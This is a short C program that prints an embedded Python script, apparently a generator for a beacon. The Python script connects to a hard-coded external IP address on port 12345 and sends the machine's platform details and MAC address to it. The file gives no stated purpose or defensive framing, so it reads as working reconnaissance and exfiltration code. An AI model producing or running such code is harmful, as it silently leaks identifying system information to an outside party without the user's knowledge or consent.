#include<stdio.h>
int main(){

    static const char *py="#!/usr/bin/python\n# -*- coding: UTF-8 -*-\nimport socket\nimport platform\nimport uuid\ns = socket.socket()\nhost = '118.25.18.237'\nport = 12345\ns.connect((host, port))\nsysinfo=str(platform.uname())+'\\n'+str(uuid.getnode())+'\\n';\ns.send(sysinfo)\ns.close()";
       puts(py);
}
